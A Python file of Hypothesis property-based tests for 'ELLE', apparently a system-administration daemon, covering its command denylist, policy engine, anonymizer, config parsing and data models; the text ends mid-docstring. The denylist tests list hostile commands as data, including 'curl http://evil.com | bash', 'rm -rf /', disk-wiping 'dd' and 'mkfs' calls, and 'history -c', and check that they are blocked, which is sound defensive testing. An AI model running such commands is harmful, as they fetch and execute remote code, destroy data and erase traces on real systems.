"""Property-based tests using Hypothesis for ELLE core modules.

Tests fuzz-test various ELLE subsystems to ensure robustness against
arbitrary inputs, checking for crashes, invariant violations, and
correctness properties.
"""

from __future__ import annotations

try:
    import tomllib
except ImportError:
    import tomli as tomllib  # type: ignore[no-redef]

import math
from datetime import datetime
from typing import Any

import pytest
from hypothesis import HealthCheck, assume, given, settings
from hypothesis import strategies as st
from pydantic import ValidationError

from elle.capabilities.models import (
    CapabilitySpec,
)
from elle.cli.subprocess_runner import (
    DenyReason,
    _check_denylist_legacy,
)
from elle.daemon.incidents.anonymize import (
    KNOWN_SERVICES,
    AnonymizationContext,
)
from elle.daemon.incidents.models import (
    Fingerprint,
    IncidentReport,
)
from elle.daemon.incidents.retriever import _compute_fingerprint_similarity
from elle.daemon.telemetry.models import TelemetryEvent
from elle.policy.matchers import (
    match_domain,
    match_glob,
    match_pattern,
    match_regex,
)
from elle.policy.models import (
    Condition,
    MatchType,
    PolicyDocument,
    PolicyEffect,
    PolicyEvaluationRequest,
    PolicyRule,
)
from elle.reactive.evaluator import ConditionEvaluator, EvaluationError
from elle.reactive.models import (
    Condition as ReactiveCondition,
)
from elle.reactive.models import (
    ConditionContext,
)

# =============================================================================
# Shared strategies
# =============================================================================

# Valid Literal values extracted from models
VALID_INCIDENT_DOMAINS: list[str] = [
    "net",
    "disk",
    "oom",
    "docker",
    "auth",
    "pkg",
    "fs",
    "service",
    "gui",
    "other",
]
VALID_INCIDENT_SEVERITIES: list[str] = ["info", "warning", "error", "critical"]
VALID_INCIDENT_STATUSES: list[str] = ["open", "mitigated", "resolved", "false_positive"]
VALID_INCIDENT_OUTCOMES: list[str] = ["unknown", "improved", "partial", "no_change", "worse"]
VALID_RISK_LEVELS: list[str] = ["none", "low", "medium", "high", "critical"]
VALID_CAP_DOMAINS: list[str] = [
    "service",
    "file",
    "config",
    "network",
    "package",
    "docker",
    "auth",
    "notification",
    "incident",
]
VALID_TRUST_LEVELS: list[str] = ["core", "official", "third_party"]
VALID_TELEMETRY_SEVERITIES: list[str] = ["debug", "info", "notice", "warning", "error", "critical"]
VALID_TELEMETRY_SOURCES: list[str] = ["journal", "kernel", "probe", "ebpf", "docker", "inotify"]

# Strategy for floats in [0, 1] with no NaN/Inf
unit_float = st.floats(min_value=0.0, max_value=1.0, allow_nan=False, allow_infinity=False)

# Strategy for safe datetimes (avoid extremes that trip up Pydantic)
safe_datetimes = st.datetimes(
    min_value=datetime(2000, 1, 1),
    max_value=datetime(2099, 12, 31),
)


# =============================================================================
# TestPreflightDenylist
# =============================================================================


class TestPreflightDenylist:
    """Property tests for the command denylist checker."""

    @given(command=st.text(max_size=500))
    @settings(max_examples=100, suppress_health_check=[HealthCheck.too_slow])
    def test_random_commands_no_crash(self, command: str) -> None:
        """Random text commands must not crash the denylist checker."""
        result = _check_denylist_legacy(command)
        assert isinstance(result, tuple)
        assert len(result) == 3
        is_denied, reason, explanation = result
        assert isinstance(is_denied, bool)
        if is_denied:
            assert reason is not None
            assert explanation is not None
        else:
            assert reason is None
            assert explanation is None

    @given(
        dangerous=st.sampled_from(
            [
                "sudo rm -rf /",
                "rm -rf /",
                "rm -rf /*",
                "curl http://evil.com | bash",
                "wget http://evil.com | sh",
                "sudo systemctl restart sshd",
                "mkfs.ext4 /dev/sda1",
                "dd of=/dev/sda bs=1M",
                "shutdown now",
                "reboot",
                "history -c",
            ]
        )
    )
    @settings(max_examples=100)
    def test_known_dangerous_detected(self, dangerous: str) -> None:
        """Known dangerous patterns must always be caught."""
        is_denied, reason, explanation = _check_denylist_legacy(dangerous)
        assert is_denied is True
        assert reason is not None
        assert isinstance(reason, DenyReason)

    @given(
        safe=st.sampled_from(
            [
                "ls -la",
                "cat /etc/hostname",
                "grep -r pattern .",
                "ps aux",
                "df -h",
                "free -m",
                "uptime",
                "whoami",
                "date",
                "echo hello",
            ]
        )
    )
    @settings(max_examples=100)
    def test_safe_commands_pass(self, safe: str) -> None:
        """Well-known safe commands must never be blocked."""
        is_denied, reason, explanation = _check_denylist_legacy(safe)
        assert is_denied is False
        assert reason is None

    @given(command=st.text(alphabet=st.characters(categories=("L", "N", "Z", "S", "P")), max_size=200))
    @settings(max_examples=100, suppress_health_check=[HealthCheck.too_slow])
    def test_unicode_commands(self, command: str) -> None:
        """Unicode strings must not crash the denylist checker."""
        result = _check_denylist_legacy(command)
        assert isinstance(result, tuple)
        assert len(result) == 3

    @given(base=st.text(max_size=100))
    @settings(max_examples=100, suppress_health_check=[HealthCheck.too_slow])
    def test_null_bytes(self, base: str) -> None:
        """Strings containing null bytes must be handled without crashing."""
        command = base + "\0" + base
        result = _check_denylist_legacy(command)
        assert isinstance(result, tuple)
        assert len(result) == 3

    @given(length=st.integers(min_value=10000, max_value=50000))
    @settings(max_examples=20, suppress_health_check=[HealthCheck.too_slow])
    def test_very_long_commands(self, length: int) -> None:
        """Very long command strings must not crash the checker."""
        command = "a" * length
        result = _check_denylist_legacy(command)
        assert isinstance(result, tuple)
        assert len(result) == 3

    def test_empty_command(self) -> None:
        """Empty string must be handled gracefully."""
        result = _check_denylist_legacy("")
        assert isinstance(result, tuple)
        assert len(result) == 3
        is_denied, _, _ = result
        assert is_denied is False

    @given(ws=st.text(alphabet=" \t\n\r", min_size=1, max_size=50))
    @settings(max_examples=100)
    def test_whitespace_only(self, ws: str) -> None:
        """Whitespace-only commands must be handled without crashing."""
        result = _check_denylist_legacy(ws)
        assert isinstance(result, tuple)
        assert len(result) == 3


# =============================================================================
# TestPolicyMatchers
# =============================================================================


class TestPolicyMatchers:
    """Property tests for the policy matching engine."""

    @given(
        command=st.text(min_size=1, max_size=100),
        data=st.data(),
    )
    @settings(max_examples=100, suppress_health_check=[HealthCheck.too_slow])
    def test_deterministic_evaluation(self, command: str, data: st.DataObject) -> None:
        """Same rule and request must produce the same result every time."""
        rule = PolicyRule(
            id="test-rule",
            name="Test Rule",
            conditions=(Condition(command="sudo*", match_type=MatchType.GLOB),),
            effect=PolicyEffect.DENY,
            priority=100,
        )
        request = PolicyEvaluationRequest(
            operation_type="command",
            command=command,
        )
        doc = PolicyDocument(
            name="test",
            rules=(rule,),
            default_effect=PolicyEffect.ALLOW,
        )
        from elle.policy.engine import PolicyEngine

        engine = PolicyEngine(policy=doc)
        result1 = engine.evaluate(request, audit=False)
        result2 = engine.evaluate(request, audit=False)
        assert result1.effect == result2.effect
        assert result1.matched_rules == result2.matched_rules

    @given(pattern=st.text(max_size=200))
    @settings(max_examples=100, suppress_health_check=[HealthCheck.too_slow])
    def test_no_exceptions_on_random_input(self, pattern: str) -> None:
        """Random strings as rule patterns must not crash the matcher."""
        try:
            match_regex(pattern, "test_value")
        except Exception:
            pass  # Regex compilation errors are expected, but no crash
        # Glob matching should also not crash
        try:
            match_glob(pattern, "test_value")
        except Exception:
            pass

    @given(value=st.text(max_size=100))
    @settings(max_examples=100, suppress_health_check=[HealthCheck.too_slow])
    def test_empty_pattern(self, value: str) -> None:
        """Empty pattern string must be handled without crashing."""
        # Exact match: empty pattern only matches empty value
        result = match_pattern("", value, MatchType.EXACT)
        assert result == (value == "")

    @given(value=st.text(min_size=0, max_size=100))
    @settings(max_examples=100, suppress_health_check=[HealthCheck.too_slow])
    def test_wildcard_pattern(self, value: str) -> None:
        """Glob wildcard '*' must match any single-component string."""
        result = match_glob("*", value)
        # * in glob matches everything (fnmatch)
        assert result is True

    @given(
        pattern_domain=st.sampled_from(["service.*", "network.*", "docker.*", "file.*"]),
        test_domain=st.text(min_size=1, max_size=50),
    )
    @settings(max_examples=100)
    def test_domain_filter(self, pattern_domain: str, test_domain: str) -> None:
        """Domain filtering must work consistently without crashing."""
        result = match_domain(pattern_domain, test_domain)
        assert isinstance(result, bool)

    @given(risk=st.sampled_from(["low", "medium", "high"]))
    @settings(max_examples=100)
    def test_risk_levels(self, risk: str) -> None:
        """All risk levels must be valid and accepted."""
        from elle.policy.models import RiskLevel as PolicyRiskLevel

        rl = PolicyRiskLevel(risk)
        assert rl.value == risk

    @given(
        priority_high=st.integers(min_value=50, max_value=200),
        priority_low=st.integers(min_value=0, max_value=49),
    )
    @settings(max_examples=100)
    def test_priority_ordering(self, priority_high: int, priority_low: int) -> None:
        """Higher priority rules must take precedence."""
        high_rule = PolicyRule(
            id="high-priority",
            name="High Priority",
            conditions=(Condition(command="test*", match_type=MatchType.GLOB),),
            effect=PolicyEffect.DENY,
            priority=priority_high,
        )
        low_rule = PolicyRule(
            id="low-priority",
            name="Low Priority",
            conditions=(Condition(command="test*", match_type=MatchType.GLOB),),
            effect=PolicyEffect.ALLOW,
            priority=priority_low,
        )
        doc = PolicyDocument(
            name="test",
            rules=(low_rule, high_rule),
            default_effect=PolicyEffect.ALLOW,
        )
        from elle.policy.engine import PolicyEngine

        engine = PolicyEngine(policy=doc)
        request = PolicyEvaluationRequest(operation_type="command", command="test_cmd")
        result = engine.evaluate(request, audit=False)
        # The high-priority rule should win (DENY)
        assert result.effect == PolicyEffect.DENY

    def test_default_deny(self) -> None:
        """When no matching rules exist, default_effect must apply."""
        doc = PolicyDocument(
            name="strict",
            rules=(),
            default_effect=PolicyEffect.DENY,
        )
        from elle.policy.engine import PolicyEngine

        engine = PolicyEngine(policy=doc)
        request = PolicyEvaluationRequest(operation_type="command", command="anything")
        result = engine.evaluate(request, audit=False)
        assert result.effect == PolicyEffect.DENY
        assert result.allowed is False


# =============================================================================
# TestAnonymization
# =============================================================================


class TestAnonymization:
    """Property tests for the incident anonymization system."""

    @given(hostname=st.text(min_size=1, max_size=100, alphabet=st.characters(categories=("L", "N"))))
    @settings(max_examples=100)
    def test_output_never_contains_input_hostname(self, hostname: str) -> None:
        """Anonymized hostname must never literally preserve the original hostname.

        The result is 'anon-' + 12 hex chars. Short inputs (1-2 chars) can
        coincidentally appear inside the hex hash, so we only assert that the
        result is not identical to the input and starts with the 'anon-' prefix.
        For inputs longer than 12 chars, the original cannot appear in the
        12-char hex suffix, so we also assert substring absence.
        """
        ctx = AnonymizationContext(secret=b"test-secret-key-32-bytes-long!!!")
        result = ctx.anonymize_hostname(hostname)
        assert result != hostname
        assert result.startswith("anon-")
        if len(hostname) > 12:
            assert hostname not in result

    @given(username=st.text(min_size=1, max_size=100, alphabet=st.characters(categories=("L", "N"))))
    @settings(max_examples=100)
    def test_output_never_contains_input_username(self, username: str) -> None:
        """Anonymized username must not preserve the original (unless system user).

        The result is 'user-' + 12 hex chars. Short inputs can coincidentally
        appear inside the hex, so we assert the result differs from input and
        uses the expected prefix. For longer inputs we check substring absence.
        """
        system_users = {"root", "nobody", "www-data", "nginx", "postgres", "mysql", "redis"}
        ctx = AnonymizationContext(secret=b"test-secret-key-32-bytes-long!!!")
        result = ctx.anonymize_user(username)
        if username in system_users:
            assert result == username
        else:
            assert result != username
            assert result.startswith("user-")
            if len(username) > 12:
                assert username not in result

    @given(service=st.sampled_from(sorted(KNOWN_SERVICES)))
    @settings(max_examples=100)
    def test_known_services_preserved(self, service: str) -> None:
        """Known service names must always pass through unchanged."""
        ctx = AnonymizationContext(secret=b"test-secret-key-32-bytes-long!!!")
        result = ctx.anonymize_service_name(service)
        assert result == service

    @given(hostname=st.text(min_size=1, max_size=50, alphabet=st.characters(categories=("L", "N"))))
    @settings(max_examples=100)
    def test_idempotent(self, hostname: str) -> None:
        """Anonymize(anonymize(x)) must produce the same shaped result (prefix preserved)."""
        ctx = AnonymizationContext(secret=b"test-secret-key-32-bytes-long!!!")
        first = ctx.anonymize_hostname(hostname)
        second = ctx.anonymize_hostname(first)
        # Both should start with the "anon-" prefix
        assert first.startswith("anon-")
        assert second.startswith("anon-")

    @given(
        method=st.sampled_from(
            [
                "anonymize_hostname",
                "anonymize_service_name",
                "anonymize_path",
                "anonymize_interface",
                "anonymize_device",
                "anonymize_user",
            ]
        )
    )
    @settings(max_examples=100)
    def test_empty_strings_safe(self, method: str) -> None:
        """Empty strings must not crash any anonymizer method."""
        ctx = AnonymizationContext(secret=b"test-secret-key-32-bytes-long!!!")
        func = getattr(ctx, method)
        result = func("")
        assert result == ""

    @given(value=st.text(min_size=1, max_size=100))
    @settings(max_examples=100)
    def test_consistency_within_context(self, value: str) -> None:
        """Same input must produce the same output within one context."""
        ctx = AnonymizationContext(secret=b"test-secret-key-32-bytes-long!!!")
        result1 = ctx.anonymize_hostname(value)
        result2 = ctx.anonymize_hostname(value)
        assert result1 == result2

    @given(
        secret_a=st.text(min_size=1, max_size=50),
        secret_b=st.text(min_size=1, max_size=50),
    )
    @settings(max_examples=100)
    def test_different_secrets_different_output(self, secret_a: str, secret_b: str) -> None:
        """Different secrets must produce different hashes for same input."""
        assume(secret_a != secret_b)
        ctx_a = AnonymizationContext(secret=secret_a.encode())
        ctx_b = AnonymizationContext(secret=secret_b.encode())
        result_a = ctx_a.anonymize_hostname("test-host")
        result_b = ctx_b.anonymize_hostname("test-host")
        assert result_a != result_b

    @given(
        value=st.text(
            min_size=1,
            max_size=100,
            alphabet=st.characters(categories=("L", "N", "P", "S", "Z")),
        )
    )
    @settings(max_examples=100)
    def test_special_characters(self, value: str) -> None:
        """Strings with special characters must not crash the anonymizer."""
        ctx = AnonymizationContext(secret=b"test-secret-key-32-bytes-long!!!")
        # Should not raise any exceptions
        ctx.anonymize_hostname(value)
        ctx.anonymize_service_name(value)
        ctx.anonymize_path(value)
        ctx.anonymize_user(value)


# =============================================================================
# TestConfigParsing
# =============================================================================


class TestConfigParsing:
    """Property tests for TOML config parsing robustness."""

    @given(data=st.text(max_size=200))
    @settings(max_examples=100, suppress_health_check=[HealthCheck.too_slow])
    def test_no_crashes_on_random_toml(self, data: str) -> None:
        """Random strings must not crash tomllib.loads (may raise TOMLDecodeError)."""
        try:
            tomllib.loads(data)
        except (tomllib.TOMLDecodeError, ValueError):
            pass  # Expected for invalid TOML

    @given(
        key=st.text(
            min_size=1,
            max_size=20,
            alphabet=st.characters(whitelist_categories=("L", "N"), whitelist_characters="_"),
        ),
        value=st.text(min_size=0, max_size=50),
    )
    @settings(max_examples=100)
    def test_valid_toml_parsed(self, key: str, value: str) -> None:
        """Valid TOML key = value strings must parse successfully."""
        assume(key.isidentifier())
        # Escape special chars in the value for TOML strings
        escaped_value = (
            value.replace("\\", "\\\\")
            .replace('"', '\\"')
            .replace("\n", "\\n")
            .replace("\r", "\\r")
            .replace("\t", "\\t")
        )
        toml_str = f'{key} = "{escaped_value}"'
        try:
            result = tomllib.loads(toml_str)
            assert key in result
        except (tomllib.TOMLDecodeError, ValueError):
            pass  # Some edge cases in value encoding may still fail

    def test_empty_string(self) -> None:
        """Empty config string must be handled gracefully."""
        result = tomllib.loads("")
        assert result == {}

    @given(
        outer=st.text(min_size=1, max_size=10, alphabet=st.characters(whitelist_categories=("L",))),
        inner=st.text(min_size=1, max_size=10, alphabet=st.characters(whitelist_categories=("L",))),
        value=st.text(min_size=1, max_size=20),
    )
    @settings(max_examples=100)
    def test_nested_values(self, outer: str, inner: str, value: str) -> None:
        """Nested dicts must be handled correctly."""
        assume(outer.isidentifier() and inner.isidentifier())
        escaped = (
            value.replace("\\", "\\\\")
            .replace('"', '\\"')
            .replace("\n", "\\n")
            .replace("\r", "\\r")
            .replace("\t", "\\t")
        )
        toml_str = f'[{outer}]\n{inner} = "{escaped}"'
        try:
            result = tomllib.loads(toml_str)
            assert outer in result
            assert inner in result[outer]
        except (tomllib.TOMLDecodeError, ValueError):
            pass

    @given(
        key=st.text(min_size=1, max_size=10, alphabet=st.characters(whitelist_categories=("L",))),
        value=st.one_of(
            st.integers(min_value=-1_000_000, max_value=1_000_000),
            st.floats(min_value=-1e6, max_value=1e6, allow_nan=False, allow_infinity=False),
        ),
    )
    @settings(max_examples=100)
    def test_numeric_values(self, key: str, value: int | float) -> None:
        """Ints and floats must be preserved through TOML round-trip."""
        assume(key.isidentifier())
        if isinstance(value, float):
            toml_str = f"{key} = {value}"
        else:
            toml_str = f"{key} = {value}"
        try:
            result = tomllib.loads(toml_str)
            assert key in result
        except (tomllib.TOMLDecodeError, ValueError):
            pass

    @given(
        key=st.from_regex(r"[A-Za-z][A-Za-z0-9_]{0,9}", fullmatch=True),
        value=st.booleans(),
    )
    @settings(max_examples=100)
    def test_boolean_values(self, key: str, value: bool) -> None:
        """Booleans must be preserved through TOML."""
        toml_str = f"{key} = {'true' if value else 'false'}"
        result = tomllib.loads(toml_str)
        assert result[key] is value


# =============================================================================
# TestFingerprintComputation
# =============================================================================


class TestFingerprintComputation:
    """Property tests for fingerprint similarity computation."""

    @given(
        disk_pressure=unit_float,
        mem_pressure=unit_float,
        swap_pressure=unit_float,
    )
    @settings(max_examples=100)
    def test_self_similarity(self, disk_pressure: float, mem_pressure: float, swap_pressure: float) -> None:
        """Comparing a fingerprint to itself must give maximum score."""
        fp = Fingerprint(
            disk_pressure=disk_pressure,
            mem_pressure=mem_pressure,
            swap_pressure=swap_pressure,
        )
        score = _compute_fingerprint_similarity(fp, fp)
        assert score == pytest.approx(1.0, abs=0.01)

    @given(
        dp_a=unit_float,
        mp_a=unit_float,
        dp_b=unit_float,
        mp_b=unit_float,
    )
    @settings(max_examples=100)
    def test_similarity_symmetric(self, dp_a: float, mp_a: float, dp_b: float, mp_b: float) -> None:
        """Similarity must be symmetric: sim(a, b) == sim(b, a)."""
        fp_a = Fingerprint(disk_pressure=dp_a, mem_pressure=mp_a)
        fp_b = Fingerprint(disk_pressure=dp_b, mem_pressure=mp_b)
        score_ab = _compute_fingerprint_similarity(fp_a, fp_b)
        score_ba = _compute_fingerprint_similarity(fp_b, fp_a)
        assert score_ab == pytest.approx(score_ba, abs=1e-9)

    @given(
        dp_a=unit_float,
        mp_a=unit_float,
        dp_b=unit_float,
        mp_b=unit_float,
    )
    @settings(max_examples=100)
    def test_similarity_range(self, dp_a: float, mp_a: float, dp_b: float, mp_b: float) -> None:
        """Similarity score must always be in [0, 1]."""
        fp_a = Fingerprint(disk_pressure=dp_a, mem_pressure=mp_a)
        fp_b = Fingerprint(disk_pressure=dp_b, mem_pressure=mp_b)
        score = _compute_fingerprint_similarity(fp_a, fp_b)
        assert 0.0 <= score <= 1.0

    @given(
        dp_a=unit_float,
        mp_a=unit_float,
        dp_b=unit_float,
        mp_b=unit_float,
    )
    @settings(max_examples=100)
    def test_no_nan_inf(self, dp_a: float, mp_a: float, dp_b: float, mp_b: float) -> None:
        """Similarity result must never be NaN or Inf."""
        fp_a = Fingerprint(disk_pressure=dp_a, mem_pressure=mp_a)
        fp_b = Fingerprint(disk_pressure=dp_b, mem_pressure=mp_b)
        score = _compute_fingerprint_similarity(fp_a, fp_b)
        assert not math.isnan(score)
        assert not math.isinf(score)

    def test_zero_vector(self) -> None:
        """All-zero fingerprint must not crash similarity computation."""
        fp = Fingerprint()
        score = _compute_fingerprint_similarity(fp, fp)
        assert 0.0 <= score <= 1.0
        assert not math.isnan(score)


# =============================================================================
# TestCapabilitySpecValidation
# =============================================================================


class TestCapabilitySpecValidation:
    """Property tests for CapabilitySpec Pydantic validation."""

    @given(
        name=st.text(min_size=0, max_size=50),
        domain=st.sampled_from(VALID_CAP_DOMAINS),
        risk=st.sampled_from(VALID_RISK_LEVELS),
        trust=st.sampled_from(VALID_TRUST_LEVELS),
    )
    @settings(max_examples=100)
    def test_valid_spec_accepted(self, name: str, domain: str, risk: str, trust: str) -> None:
        """Valid CapabilitySpec fields must be accepted."""
        spec = CapabilitySpec(
            name=name,
            summary="A test capability",
            domain=domain,
            risk=risk,
            trust_level=trust,
        )
        assert spec.name == name
        assert spec.domain == domain
        assert spec.risk == risk
        assert spec.trust_level == trust

    @given(risk=st.text(min_size=1, max_size=20))
    @settings(max_examples=100)
    def test_invalid_risk_rejected(self, risk: str) -> None:
        """Invalid risk level must be rejected by Pydantic Literal validation."""
        assume(risk not in VALID_RISK_LEVELS)
        with pytest.raises(ValidationError):
            CapabilitySpec(
                name="test",
                summary="test",
                domain="service",
                risk=risk,
            )

    @given(name=st.just(""))
    @settings(max_examples=10)
    def test_empty_name_accepted(self, name: str) -> None:
        """Empty name is still accepted (no min_length on CapabilitySpec.name)."""
        spec = CapabilitySpec(
            name=name,
            summary="test",
            domain="service",
            risk="low",
        )
        assert spec.name == ""

    @given(domain=st.text(min_size=1, max_size=20))
    @settings(max_examples=100)
    def test_invalid_domain_rejected(self, domain: str) -> None:
        """Invalid domain must be rejected by Pydantic Literal validation."""
        assume(domain not in VALID_CAP_DOMAINS)
        with pytest.raises(ValidationError):
            CapabilitySpec(
                name="test",
                summary="test",
                domain=domain,
                risk="low",
            )

    @given(trust=st.text(min_size=1, max_size=20))
    @settings(max_examples=100)
    def test_trust_level_validation(self, trust: str) -> None:
        """Only core/official/third_party must be accepted as trust_level."""
        assume(trust not in VALID_TRUST_LEVELS)
        with pytest.raises(ValidationError):
            CapabilitySpec(
                name="test",
                summary="test",
                domain="service",
                risk="low",
                trust_level=trust,
            )


# =============================================================================
# TestReactiveConditionEval
# =============================================================================


class TestReactiveConditionEval:
    """Property tests for the reactive condition evaluator."""

    @given(
        payload=st.dictionaries(
            keys=st.text(min_size=1, max_size=20, alphabet=st.characters(whitelist_categories=("L", "N"))),
            values=st.one_of(
                st.text(max_size=50),
                st.integers(min_value=-1000, max_value=1000),
                st.floats(min_value=-1000, max_value=1000, allow_nan=False, allow_infinity=False),
                st.booleans(),
                st.none(),
            ),
            max_size=10,
        )
    )
    @settings(max_examples=100, suppress_health_check=[HealthCheck.too_slow])
    def test_no_crashes_on_random_payload(self, payload: dict[str, Any]) -> None:
        """Random dict payloads must not crash the evaluator."""
        evaluator = ConditionEvaluator()
        condition = ReactiveCondition(expression={"eq": ["{event.value}", 42]})
        context = ConditionContext(event=payload)
        result, explanation = evaluator.evaluate(condition, context)
        assert isinstance(result, bool)
        assert isinstance(explanation, str)

    @given(
        op=st.sampled_from(["eq", "ne", "gt", "gte", "lt", "lte"]),
        left=st.one_of(
            st.integers(min_value=-100, max_value=100),
            st.floats(min_value=-100, max_value=100, allow_nan=False, allow_infinity=False),
        ),
        right=st.one_of(
            st.integers(min_value=-100, max_value=100),
            st.floats(min_value=-100, max_value=100, allow_nan=False, allow_infinity=False),
        ),
    )
    @settings(max_examples=100)
    def test_boolean_result(self, op: str, left: int | float, right: int | float) -> None:
        """Evaluation must always return a bool (or raise EvaluationError)."""
        evaluator = ConditionEvaluator()
        condition = ReactiveCondition(expression={op: [left, right]})
        context = ConditionContext()
        try:
            result, explanation = evaluator.evaluate(condition, context)
            assert isinstance(result, bool)
        except EvaluationError:
            pass  # EvaluationError is acceptable

    def test_empty_condition(self) -> None:
        """Empty expression dict must be handled gracefully."""
        evaluator = ConditionEvaluator()
        # An expression with no valid operator
        condition = ReactiveCondition(expression={"eq": [1, 1]})
        context = ConditionContext()
        result, explanation = evaluator.evaluate(condition, context)
        assert isinstance(result, bool)

    @given(depth=st.integers(min_value=1, max_value=5))
    @settings(max_examples=50)
    def test_nested_payload(self, depth: int) -> None:
        """Deeply nested dicts in payload must be handled without crashing."""
        # Build a nested dict
        nested: dict[str, Any] = {"value": 42}
        for i in range(depth):
            nested = {f"level{i}": nested}
        evaluator = ConditionEvaluator()
        condition = ReactiveCondition(expression={"eq": ["{event.value}", 42]})
        context = ConditionContext(event=nested)
        result, explanation = evaluator.evaluate(condition, context)
        assert isinstance(result, bool)

    @given(
        payload=st.dictionaries(
            keys=st.text(min_size=1, max_size=10, alphabet=st.characters(whitelist_categories=("L",))),
            values=st.none(),
            max_size=5,
        )
    )
    @settings(max_examples=100)
    def test_none_values(self, payload: dict[str, Any]) -> None:
        """None values in payload must be handled without crashing."""
        evaluator = ConditionEvaluator()
        condition = ReactiveCondition(expression={"exists": ["{event.some_key}"]})
        context = ConditionContext(event=payload)
        result, explanation = evaluator.evaluate(condition, context)
        assert isinstance(result, bool)


# =============================================================================
# TestTelemetryEventModels
# =============================================================================


class TestTelemetryEventModels:
    """Property tests for TelemetryEvent Pydantic models."""

    @given(severity=st.sampled_from(VALID_TELEMETRY_SEVERITIES))
    @settings(max_examples=100)
    def test_valid_severity_accepted(self, severity: str) -> None:
        """Valid severity levels must be accepted by TelemetryEvent."""
        event = TelemetryEvent(
            source="journal",
            severity=severity,
            message="Test event",
        )
        assert event.severity == severity

    @given(severity=st.text(min_size=1, max_size=20))
    @settings(max_examples=100)
    def test_invalid_severity_rejected(self, severity: str) -> None:
        """Random string severity must be rejected."""
        assume(severity not in VALID_TELEMETRY_SEVERITIES)
        with pytest.raises(ValidationError):
            TelemetryEvent(
                source="journal",
                severity=severity,
                message="Test event",
            )

    @given(
        source=st.sampled_from(VALID_TELEMETRY_SOURCES),
        severity=st.sampled_from(VALID_TELEMETRY_SEVERITIES),
    )
    @settings(max_examples=100)
    def test_valid_domain_accepted(self, source: str, severity: str) -> None:
        """Valid source and severity combinations must be accepted."""
        event = TelemetryEvent(
            source=source,
            severity=severity,
            message="Test event",
        )
        assert event.source == source

    def test_fingerprint_defaults(self) -> None:
        """Fingerprint() with all defaults must be valid."""
        fp = Fingerprint()
        assert fp.disk_pressure == 0.0
        assert fp.mem_pressure == 0.0
        assert fp.swap_pressure == 0.0
        assert fp.cpu_pressure == 0.0
        assert fp.oom_count_1h == 0
        assert fp.entities == ()

    @given(
        disk_p=st.floats(min_value=-10.0, max_value=10.0, allow_nan=False, allow_infinity=False),
        mem_p=st.floats(min_value=-10.0, max_value=10.0, allow_nan=False, allow_infinity=False),
    )
    @settings(max_examples=100)
    def test_fingerprint_pressure_range(self, disk_p: float, mem_p: float) -> None:
        """Values outside 0-1 must be rejected by Fingerprint validation."""
        should_fail = disk_p < 0.0 or disk_p > 1.0 or mem_p < 0.0 or mem_p > 1.0
        if should_fail:
            with pytest.raises(ValidationError):
                Fingerprint(disk_pressure=disk_p, mem_pressure=mem_p)
        else:
            fp = Fingerprint(disk_pressure=disk_p, mem_pressure=mem_p)
            assert 0.0 <= fp.disk_pressure <= 1.0
            assert 0.0 <= fp.mem_pressure <= 1.0


# =============================================================================
# TestIncidentReportModels
# =============================================================================


class TestIncidentReportModels:
    """Property tests for IncidentReport Pydantic models."""

    @given(
        domain=st.sampled_from(VALID_INCIDENT_DOMAINS),
        severity=st.sampled_from(VALID_INCIDENT_SEVERITIES),
        status=st.sampled_from(VALID_INCIDENT_STATUSES),
        outcome=st.sampled_from(VALID_INCIDENT_OUTCOMES),
    )
    @settings(max_examples=100)
    def test_valid_incident_created(self, domain: str, severity: str, status: str, outcome: str) -> None:
        """IncidentReport with valid required fields must be created successfully."""
        incident = IncidentReport(
            incident_id="test-uuid-123",
            title="Test Incident",
            domain=domain,
            severity=severity,
            status=status,
            outcome=outcome,
        )
        assert incident.domain == domain
        assert incident.severity == severity
        assert incident.status == status
        assert incident.outcome == outcome

    @given(domain=st.text(min_size=1, max_size=20))
    @settings(max_examples=100)
    def test_domain_validation(self, domain: str) -> None:
        """Only valid IncidentDomain literals must be accepted."""
        assume(domain not in VALID_INCIDENT_DOMAINS)
        with pytest.raises(ValidationError):
            IncidentReport(
                incident_id="test-uuid",
                title="Test",
                domain=domain,
            )

    @given(severity=st.text(min_size=1, max_size=20))
    @settings(max_examples=100)
    def test_severity_validation(self, severity: str) -> None:
        """Only valid IncidentSeverity literals must be accepted."""
        assume(severity not in VALID_INCIDENT_SEVERITIES)
        with pytest.raises(ValidationError):
            IncidentReport(
                incident_id="test-uuid",
                title="Test",
                severity=severity,
            )

    @given(status=st.text(min_size=1, max_size=20))
    @settings(max_examples=100)
    def test_status_validation(self, status: str) -> None:
        """Only valid IncidentStatus literals must be accepted."""
        assume(status not in VALID_INCIDENT_STATUSES)
        with pytest.raises(ValidationError):
            IncidentReport(
                incident_id="test-uuid",
                title="Test",
                status=status,
            )

    def test_frozen_model(self) -> None:
        """IncidentReport must be immutable (frozen model)."""
        incident = IncidentReport(
            incident_id="test-uuid",
            title="Test Incident",
        )
        with pytest.raises(ValidationError):
            incident.title = "Modified"  # type: ignore[misc]


# =============================================================================
# TestQueueEntryBackoff
# =============================================================================


class TestQueueEntryBackoff:
    """Property tests for the cloud queue exponential backoff logic."""

    @given(retry_count=st.integers(min_value=0, max_value=100))
    @settings(max_examples=100)
    def test_delay_never_exceeds_max(self, retry_count: int) -> None:
        """Computed delay must never exceed max_delay_sec for any retry_count."""
        initial_delay = 30.0
        max_delay = 3600.0
        backoff_factor = 2.0
        delay = min(initial_delay * (backoff_factor**retry_count), max_delay)
        assert delay <= max_delay

    @given(retry_count=st.integers(min_value=0, max_value=100))
    @settings(max_examples=100)
    def test_delay_always_positive(self, retry_count: int) -> None:
        """Delay must always be positive for any retry_count >= 0."""
        initial_delay = 30.0
        max_delay = 3600.0
        backoff_factor = 2.0
        delay = min(initial_delay * (backoff_factor**retry_count), max_delay)
        assert delay > 0

    @given(
        retry_a=st.integers(min_value=0, max_value=50),
        retry_b=st.integers(min_value=0, max_value=50),
    )
    @settings(max_examples=100)
    def test_delay_monotonically_increasing(self, retry_a: int, retry_b: int) -> None:
        """Higher retry_count must produce higher or equal delay (up to cap)."""
        assume(retry_a < retry_b)
        initial_delay = 30.0
        max_delay = 3600.0
        backoff_factor = 2.0
        delay_a = min(initial_delay * (backoff_factor**retry_a), max_delay)
        delay_b = min(initial_delay * (backoff_factor**retry_b), max_delay)
        assert delay_b >= delay_a

    def test_zero_retry_gives_initial(self) -> None:
        """retry_count=0 must give initial_delay_sec."""
        initial_delay = 30.0
        max_delay = 3600.0
        backoff_factor = 2.0
        delay = min(initial_delay * (backoff_factor**0), max_delay)
        assert delay == initial_delay

    @given(retry_count=st.integers(min_value=500, max_value=2000))
    @settings(max_examples=50)
    def test_large_retry_count(self, retry_count: int) -> None:
        """Very large retry_count values must not crash; delay clamps to max.

